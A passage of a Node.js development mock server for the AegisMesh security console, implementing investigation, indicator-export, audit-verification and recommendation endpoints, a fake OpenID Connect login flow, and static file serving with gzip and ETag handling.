    const scopes = ['session', 'source', 'investigation', 'window'].filter((k) => url.searchParams.has(k));
    if (scopes.length !== 1 || !url.searchParams.get(scopes[0])) return fail(res, 'invalid_argument', 'exactly one scope is required');
    if (!need('evidence.export', 'export.indicators', scopes[0] === 'source' ? '' : url.searchParams.get(scopes[0]))) return;
    const sn = snap();
    const v = url.searchParams.get(scopes[0]);
    let scoped;
    let target = '';
    if (scopes[0] === 'session') {
      const found = findSession(v);
      if (!found) return;
      scoped = found.session._events;
      target = v;
    } else if (scopes[0] === 'source') {
      if (Buffer.byteLength(v) > 255) return fail(res, 'invalid_argument', 'source too long');
      scoped = sn.events.filter((e) => e.source === v);
    } else if (scopes[0] === 'investigation') {
      const inv = T.investigations.get(v);
      if (!inv) return fail(res, 'not_found', 'investigation not found');
      scoped = inv.event_ids.map((id) => T.localById(id)).filter(Boolean);
      target = v;
    } else {
      if (!WINDOW_MS[v]) return fail(res, 'invalid_argument', 'window must be 1h, 24h or 7d');
      scoped = sn.events.filter((e) => Date.parse(e.time) >= Date.now() - WINDOW_MS[v]);
    }
    const ind = indicatorsOf(scoped);
    audit(who.name, who.role, 'export.indicators', target, 'ok', remote);
    const name = { stix: 'aegismesh-indicators.json', csv: 'aegismesh-indicators.csv', txt: 'aegismesh-indicators.txt' }[format];
    const type = { stix: 'application/json', csv: 'text/csv; charset=utf-8', txt: 'text/plain; charset=utf-8' }[format];
    return attachment(renderIndicators(format, ind), type, name, sn, { 'X-AegisMesh-Skipped-Non-IP-Sources': String(ind.skippedSources), 'X-AegisMesh-Skipped-Non-IP-Events': String(ind.skippedEvents) });
  }

  const invReport = p.match(/^\/investigations\/([^/]+)\/report$/);
  if (m === 'GET' && invReport) {
    if (!strictQuery([])) return;
    const id = decodeURIComponent(invReport[1]);
    if (!need('reports.download', 'investigation.report', id)) return;
    const inv = T.investigations.get(id);
    if (!inv) return fail(res, 'not_found', 'investigation not found');
    const resolved = inv.event_ids.map((x) => T.localById(x)).filter(Boolean);
    audit(who.name, who.role, 'investigation.report', id, 'ok', remote);
    return attachment(renderReport({ scope: `Investigation ${id}`, title: inv.title, events: resolved, notes: inv.notes, unresolved: inv.event_ids.length - resolved.length }), 'text/markdown; charset=utf-8', 'aegismesh-observation-report.md', snap());
  }

  if (m === 'GET' && p === '/recommendations') {
    const limit = Number(url.searchParams.get('limit') || 20);
    if (!Number.isInteger(limit) || limit < 0 || limit > 1000) return fail(res, 'invalid_argument', 'limit must be within 0..1000');
    // Recommendations use local evidence only (contract).
    const sigs = T.localEvents().filter((e) => e.classification !== 'interaction').slice(0, limit);
    return send(res, 200, {
      schema: 'aegismesh.recommendation/v1', mode: 'dry_run', interpretation: 'signal_not_incident', kind: 'recommendation', status: 'proposed',
      recommendations: sigs.map((e) => ({
        schema: 'aegismesh.recommendation/v1', mode: 'dry_run', interpretation: 'signal_not_incident', kind: 'recommendation', status: 'proposed',
        classification: e.classification, sensor_id: e.sensor.id, sensor_kind: e.sensor.kind, id: `rec_${e.id.slice(0, 12)}`,
        rule_ids: e.rule_ids,
        summary: e.classification === 'canary_invocation' ? 'A canary invocation was observed; review the linked evidence and decoy configuration.' : 'A correlation signal links several observations from one source; review them together.',
        operator_review: 'Confirm the decoy is still isolated and that no production credential matches the canary.',
        next_steps: ['Open the linked evidence and read the stored envelope.', 'Check whether the source appears in other sensors.'],
        evidence: (e._cites || [e.id]).map((id) => ({ event_id: id, payload_sha256: createHash('sha256').update(id).digest('hex'), integrity_scope: 'observation_payload_only', verification: 'payload_hash_consistent' })),
        false_positive_notes: ['Internal vulnerability scanners trigger the same pattern.'],
        ...(e._cites ? { source_resolution: { resolved: e._cites.length, unresolved: 0 } } : {}),
      })),
    });
  }

  if (m === 'GET' && p === '/node') {
    // Node metadata belongs to the local tenant; others get 404.
    if (!T.local) return fail(res, 'not_found', 'no local node in this tenant');
    return send(res, 200, {
      instance: 'node-dev-01', version: { version: '0.3.0-dev', commit: 'mock', go: 'go1.25' },
      started_at: new Date(now - 26 * 3600e3).toISOString().replace(/\.\d+Z$/, 'Z'), uptime_seconds: Math.floor((Date.now() - now) / 1000) + 26 * 3600,
      healthy: true, sensors: { wanted: 4, started: 3 }, bus: { dropped_events: 0 },
      storage: { healthy: true, segments: 3, bytes: 18_874_368, encrypted: false, retention: { max_events: 100000, max_age_days: 30 } },
      // Accepting hubs report history "unavailable": forwarded copies are live-only.
      index: { events: events.length, capacity: 50000, oldest: events[events.length - 1].time, history: T.fleet.accepting ? 'unavailable' : 'complete' },
      console: { listen: `${HOST}:${PORT}`, tls: false, session_ttl_seconds: SESSION_TTL },
    });
  }

  if (p === '/investigations' && m === 'GET') {
    const status = url.searchParams.get('status') || '';
    if (status && !['open', 'monitoring', 'closed'].includes(status)) return fail(res, 'invalid_argument', 'bad status');
    const list = [...T.investigations.values()].filter((i) => !status || i.status === status).sort((a, b) => b.updated_at.localeCompare(a.updated_at));
    return send(res, 200, { investigations: list.map((i) => invView(T, i, false)) });
  }
  if (p === '/investigations' && m === 'POST') {
    if (!need('investigations.write', 'investigation.create')) return;
    let b;
    try { b = await readBody(req, ['title', 'priority', 'event_ids']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
    if (typeof b.title !== 'string' || !b.title.trim() || b.title.length > 200) return fail(res, 'invalid_argument', 'title is required (≤200 chars)');
    const ids = Array.isArray(b.event_ids) ? b.event_ids : [];
    if (ids.length > 200 || ids.some((x) => !/^[0-9a-f]{32}$/.test(x))) return fail(res, 'invalid_argument', 'bad event_ids');
    if (ids.some((x) => !T.localById(x))) return fail(res, 'not_found', 'event not in index');
    const inv = newInv(T, b.title.trim(), b.priority || 'medium', ids, who.name);
    audit(who.name, who.role, 'investigation.create', inv.id, 'ok', remote);
    return send(res, 201, invView(T, inv, true));
  }
  if ((mm = /^\/investigations\/([A-Za-z0-9_.-]+)(\/notes|\/events\/([0-9a-f]{32}))?$/.exec(p))) {
    const inv = T.investigations.get(mm[1]);
    if (!inv) return fail(res, 'not_found', 'no such investigation');
    const touch = () => { inv.updated_at = new Date().toISOString().replace(/\.\d+Z$/, 'Z'); };
    if (!mm[2] && m === 'GET') return send(res, 200, invView(T, inv, true));
    if (!mm[2] && m === 'PATCH') {
      if (!need('investigations.write', 'investigation.update', inv.id)) return;
      let b;
      try { b = await readBody(req, ['title', 'status', 'priority']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
      if (b.status && !['open', 'monitoring', 'closed'].includes(b.status)) return fail(res, 'invalid_argument', 'bad status');
      if (b.priority && !['low', 'medium', 'high'].includes(b.priority)) return fail(res, 'invalid_argument', 'bad priority');
      Object.assign(inv, b);
      touch();
      audit(who.name, who.role, 'investigation.update', inv.id, 'ok', remote, Object.keys(b).join(','));
      return send(res, 200, invView(T, inv, true));
    }
    if (mm[2] === '/notes' && m === 'POST') {
      if (!need('investigations.write', 'investigation.note', inv.id)) return;
      let b;
      try { b = await readBody(req, ['text']); } catch (err) { return fail(res, 'invalid_argument', err.message); }
      if (typeof b.text !== 'string' || !b.text.trim() || [...b.text].length > 4000) return fail(res, 'invalid_argument', 'text is required (≤4000 chars)');
      inv.notes.push({ id: hex(8), time: new Date().toISOString().replace(/\.\d+Z$/, 'Z'), author: who.name, text: b.text });
      touch();
      audit(who.name, who.role, 'investigation.note', inv.id, 'ok', remote);
      return send(res, 201, invView(T, inv, true));
    }
    if (mm[3] && (m === 'PUT' || m === 'DELETE')) {
      const action = m === 'PUT' ? 'investigation.attach' : 'investigation.detach';
      if (!need('investigations.write', action, inv.id)) return;
      if (m === 'PUT') {
        if (!T.localById(mm[3])) return fail(res, 'not_found', 'event not in index');
        if (!inv.event_ids.includes(mm[3])) {
          if (inv.event_ids.length >= 200) return fail(res, 'conflict', 'investigation already holds 200 events');
          inv.event_ids.push(mm[3]);
        }
      } else {
        inv.event_ids = inv.event_ids.filter((x) => x !== mm[3]);
      }
      touch();
      audit(who.name, who.role, action, inv.id, 'ok', remote, mm[3]);
      return send(res, 200, invView(T, inv, true));
    }
  }

  if (m === 'GET' && p === '/audit') {
    if (!need('audit.read', 'audit.read')) return;
    const action = url.searchParams.get('action') || '';
    const actor = url.searchParams.get('actor') || '';
    audit(who.name, who.role, 'audit.read', '', 'ok', remote);
    const list = T.audit.slice().reverse().filter((r) => (!action || r.action === action) && (!actor || r.actor === actor));
    const pg = paginate(list, url);
    if (pg.error) return fail(res, 'invalid_argument', pg.error);
    return send(res, 200, { records: pg.page, next_cursor: pg.next });
  }
  if (m === 'GET' && p === '/audit/verify') {
    if (!need('audit.read', 'audit.verify')) return;
    audit(who.name, who.role, 'audit.verify', '', 'ok', remote);
    let prev = '0'.repeat(64);
    for (const r of T.audit) {
      const { hash, ...rest } = r;
      if (r.prev_hash !== prev || createHash('sha256').update(JSON.stringify(rest)).digest('hex') !== hash) {
        return send(res, 200, { verified: false, records: T.audit.length, first_invalid_seq: r.seq, error: `hash mismatch at seq ${r.seq}` });
      }
      prev = hash;
    }
    return send(res, 200, { verified: true, records: T.audit.length, first_invalid_seq: 0, error: '' });
  }

  if (await T.fleet({ req, res, url, p, m, need, record: audit, who, remote, send, fail, readBody })) return;

  return fail(res, 'not_found', 'no such endpoint');
}

// ---- OIDC (fake provider hop) ----------------------------------------------
//
// Mirrors the contract's browser-visible behavior only: login sets a short
// pre-login cookie bound to a single-use state and redirects to the
// provider; the callback accepts a fixed parameter set, discards provider
// text, and redirects to "/" (session cookie set) or to
// "/#/login?error=<code>". The provider is a page on this mock.

const OIDC_ERRORS = ['unavailable', 'rate_limited', 'invalid_request', 'invalid_state', 'invalid_identity', 'access_denied'];
const pending = new Map(); // state → { binding, expires }
const OIDC_COOKIE = 'aegismesh_oidc';

function redirect(res, location, cookies = []) {
  res.writeHead(302, securityHeaders({ Location: location, 'Cache-Control': 'no-store', ...(cookies.length ? { 'Set-Cookie': cookies } : {}) }));
  res.end();
}

const clearOidcCookie = `${OIDC_COOKIE}=; Path=/api/v1/auth/oidc; HttpOnly; SameSite=Lax; Max-Age=0`;
const loginError = (res, code) => redirect(res, `/#/login?error=${code}`, [clearOidcCookie]);

function oidcRoute(req, res, url, p, m, remote) {
  if (!OIDC_AUTH) return fail(res, 'not_found', 'OIDC is not configured');
  if (m !== 'GET') return fail(res, 'not_found', 'no such endpoint');
  const now2 = Date.now();
  for (const [k, v] of pending) if (v.expires < now2) pending.delete(k);

  if (p === '/auth/oidc/login') {
    if (pending.size >= 128) return loginError(res, 'rate_limited');
    const state = randomBytes(16).toString('base64url');
    const binding = randomBytes(16).toString('base64url');
    pending.set(state, { binding, expires: now2 + 120e3 });
    return redirect(res, `/__mock/idp/authorize?state=${state}`, [`${OIDC_COOKIE}=${binding}; Path=/api/v1/auth/oidc; HttpOnly; SameSite=Lax; Max-Age=120`]);
  }

  if (p === '/auth/oidc/callback') {
    const allowed = ['state', 'code', 'error', 'error_description', 'iss', 'session_state'];
    const keys = [...url.searchParams.keys()];
    if (keys.some((k) => !allowed.includes(k)) || keys.length !== new Set(keys).size) return loginError(res, 'invalid_request');
    const state = url.searchParams.get('state') || '';
    const entry = pending.get(state);
    pending.delete(state); // single use, whatever happens next
    const m2 = new RegExp(`(?:^|;\\s*)${OIDC_COOKIE}=([A-Za-z0-9_-]+)`).exec(req.headers.cookie || '');
    if (!entry || !m2 || m2[1] !== entry.binding) return loginError(res, 'invalid_state');
    // The provider's error and error_description are discarded.
    if (url.searchParams.has('error')) return loginError(res, 'access_denied');
    const code = url.searchParams.get('code');
    if (!code) return loginError(res, 'invalid_request');
    if (code === 'outage') return loginError(res, 'unavailable');
    if (code === 'busy') return loginError(res, 'rate_limited');
    const id = IDENTITIES.get(code);
    if (!id) return loginError(res, 'invalid_request');
    const claims = { issuer: OIDC_ISSUER, subject: id.sub };
    if (!id.role || !id.tenants.length) {
      if (TENANTS.length === 1) record(localTenant, '', '', 'session.oidc_denied', '', 'denied', remote, '', claims);
      return loginError(res, 'invalid_identity');
    }
    // Initial tenant: the first mapped membership in sorted order.
    const sorted = [...id.tenants].sort();
    const old = cookieSession(req);
    if (old) { sessions.delete(old.id); endStreams(old.id); }
    const { sid, s: sess } = newSession({
      name: id.name, role: id.role, auth_method: 'oidc', tenant: sorted[0], tenants: [...id.tenants],
      account_id: accounts.touchOidc(id.sub, id.name, id.role, id.tenants), remote, client: clientFamily(req.headers['user-agent']),
    });
    record(tenants.get(sess.tenant), id.name, id.role, 'session.oidc_login', '', 'ok', remote, '', claims);
    return redirect(res, '/', [sessionCookie(sid), clearOidcCookie]);
  }
  return fail(res, 'not_found', 'no such endpoint');
}

// The fake identity provider's page: plain links back to the callback, one
// per synthetic identity and per failure. Development only.
function idpPage(res, url) {
  const state = url.searchParams.get('state') || '';
  const safe = /^[A-Za-z0-9_-]{1,64}$/.test(state) ? state : '';
  const cb = (q) => `/api/v1/auth/oidc/callback?${q}`;
  const rows = [
    ['Sign in as ada (admin, every tenant)', cb(`state=${safe}&code=ada&iss=${encodeURIComponent(OIDC_ISSUER)}`)],
    ['Sign in as ana (analyst, every tenant)', cb(`state=${safe}&code=ana`)],
    ['Sign in as vera (viewer, local tenant only)', cb(`state=${safe}&code=vera`)],
  ];
  const failures = [
    ['Deny consent (access_denied, with provider text)', cb(`state=${safe}&error=access_denied&error_description=${encodeURIComponent('<b>Provider says:</b> call 555-0100')}`)],
    ['Identity with no operator mapping (invalid_identity)', cb(`state=${safe}&code=nobody`)],
    ['Wrong state (invalid_state)', cb('state=forged-state&code=ada')],
    ['Missing code (invalid_request)', cb(`state=${safe}`)],
    ['Provider outage (unavailable)', cb(`state=${safe}&code=outage`)],
    ['Too many attempts (rate_limited)', cb(`state=${safe}&code=busy`)],
  ];
  const esc = (v) => String(v).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  const list = (items) => `<ul class="menu__list stack">${items.map(([t, h]) => `<li><a class="btn btn--block" href="${esc(h)}">${esc(t)}</a></li>`).join('')}</ul>`;
  const html = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Mock identity provider</title>
<link rel="stylesheet" href="/assets/css/tokens.css"><link rel="stylesheet" href="/assets/css/base.css"><link rel="stylesheet" href="/assets/css/components.css"><link rel="stylesheet" href="/assets/css/app.css">
</head><body><main class="login"><div class="login__card">
<h1>${esc(OIDC_DISPLAY_NAME)}</h1>
<p class="muted">Development mock of an OpenID Connect provider. Nothing here is real: choose who to be, or which failure to send back.</p>
${safe ? '' : '<p class="banner banner--warn">No valid state in this request: every choice below will fail as invalid_state.</p>'}
<h2 class="field__label">Identities</h2>${list(rows)}
<h2 class="field__label">Failures</h2>${list(failures)}
</div></main></body></html>`;
  res.writeHead(200, securityHeaders({ 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }));
  res.end(html);
}

// ---- Static files ------------------------------------------------------------
//
// Mirrors the server: non-index assets negotiate gzip (text, JS, JSON, SVG
// above 256 bytes, when smaller), carry a representation-specific strong
// SHA-256 ETag, Cache-Control: no-cache and Vary: Accept-Encoding, and answer
// a matching If-None-Match with 304. index.html stays no-store, uncompressed,
// without an ETag. Ranges are ignored.

const staticCache = new Map(); // file → { raw, gz, etagRaw, etagGz }
const etagOf = (buf) => `"${createHash('sha256').update(buf).digest('hex')}"`;

// q-values for gzip and identity from Accept-Encoding.
function acceptEncoding(header) {
  const q = { gzip: 0, identity: 1, star: null };
  if (header === undefined) return q;
  for (const part of String(header).split(',')) {
    const [name, ...params] = part.trim().toLowerCase().split(';');
    if (!name) continue;
    const qp = params.map((x) => x.trim()).find((x) => x.startsWith('q='));
    const v = qp ? Number(qp.slice(2)) : 1;
    const val = Number.isFinite(v) ? v : 0;
    if (name === 'gzip' || name === 'x-gzip') q.gzip = val;
    else if (name === 'identity') q.identity = val;
    else if (name === '*') q.star = val;
  }
  if (q.star !== null) {
    if (!/gzip/.test(header)) q.gzip = q.star;
    if (!/identity/.test(header)) q.identity = q.star;
  }
  return q;
}

function ifNoneMatch(header, etag) {
  if (!header) return false;
  return header.split(',').map((x) => x.trim().replace(/^W\//, '')).some((x) => x === '*' || x === etag);
}

async function serveSite(res, url) {
  let rel;
  try { rel = decodeURIComponent(url.pathname.slice('/__site'.length)); } catch { return fail(res, 'not_found', 'not found'); }
  if (rel === '/') rel = '/index.html';
  const file = path.resolve(SITE_DIR, `.${rel}`);
  if (!file.startsWith(SITE_DIR + path.sep)) return fail(res, 'not_found', 'not found');
  const type = TYPES[path.extname(file)];
  if (!type) return fail(res, 'not_found', 'not found');
  try {
    const raw = await readFile(file);
    res.writeHead(200, securityHeaders({ 'Content-Type': type, 'Cache-Control': 'no-store' }));
    return res.end(raw);
  } catch {
    return fail(res, 'not_found', 'not found');
  }
}

async function serveStatic(req, res, url) {
  let rel;
  try { rel = decodeURIComponent(url.pathname); } catch { return fail(res, 'not_found', 'not found'); }
  if (rel === '/') rel = '/index.html';
  const file = path.resolve(STATIC, `.${rel}`);
  if (!file.startsWith(STATIC + path.sep)) return fail(res, 'not_found', 'not found');
  const type = TYPES[path.extname(file)];
  if (!type) return fail(res, 'not_found', 'not found');
  let entry = staticCache.get(file);
  try {
    const raw = await readFile(file);
    if (!entry || !entry.raw.equals(raw)) {
      const gz = raw.length > 256 ? gzipSync(raw, { level: 9 }) : null;
      entry = { raw, gz: gz && gz.length < raw.length ? gz : null };
      entry.etagRaw = etagOf(raw);
      entry.etagGz = entry.gz ? etagOf(entry.gz) : '';
      staticCache.set(file, entry);
    }
  } catch {
    return fail(res, 'not_found', 'not found');
  }
  if (rel === '/index.html') {
    res.writeHead(200, securityHeaders({ 'Content-Type': type, 'Cache-Control': 'no-store' }));
    return res.end(entry.raw);
  }
  const acc = acceptEncoding(req.headers['accept-encoding']);
  const useGz = Boolean(entry.gz) && acc.gzip > 0;
  if (!useGz && acc.identity <= 0) return fail(res, 'invalid_argument', 'no acceptable encoding', {}, 406);
  const body = useGz ? entry.gz : entry.raw;
  const etag = useGz ? entry.etagGz : entry.etagRaw;
  const headers = { 'Content-Type': type, 'Cache-Control': 'no-cache', ETag: etag, Vary: 'Accept-Encoding', ...(useGz ? { 'Content-Encoding': 'gzip' } : {}) };
  if (ifNoneMatch(req.headers['if-none-match'], etag)) {
    res.writeHead(304, securityHeaders(headers));
    return res.end();
  }
  res.writeHead(200, securityHeaders({ ...headers, 'Content-Length': body.length }));
  res.end(req.method === 'HEAD' ? undefined : body);
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${HOST}:${PORT}`);
  const host = req.headers.host || '';
  if (host !== `${HOST}:${PORT}` && host !== `localhost:${PORT}`) return fail(res, 'invalid_argument', 'host mismatch'); // 421 in production
  try {
    if (url.pathname.startsWith('/api/v1/')) return await api(req, res, url);
    if (url.pathname.startsWith('/__site/') && req.method === 'GET') return await serveSite(res, url);
    if (url.pathname === '/__mock/burst' && req.method === 'GET') return send(res, 200, { sent: burst(url.searchParams.get('n') || 200), streams: streams.size });
    if (url.pathname === '/__mock/idp/authorize' && req.method === 'GET' && OIDC_AUTH) return idpPage(res, url);
    if (req.method !== 'GET') return fail(res, 'not_found', 'not found');
    return await serveStatic(req, res, url);
  } catch (err) {
    fail(res, 'internal', err.message);
  }
});

server.listen(PORT, HOST, () => {
  console.log(`AegisMesh console mock on http://${HOST}:${PORT}/  (tokens: dev-viewer, dev-analyst, dev-admin; fleet: ${FLEET_MODE}; accept evidence: ${localTenant.fleet.accepting ? 'on' : 'off'}; auth: ${AUTH_MODE}; tenants: ${TENANTS.join(',')}; round4: ${ROUND4 ? 'on' : 'off'}; round5: ${ROUND5 ? 'on' : 'off'}; round6: ${ROUND6 ? 'on' : 'off'}; settings editing: ${ROUND6 && SETTINGS_EDITING ? 'on' : 'off'})`);
});
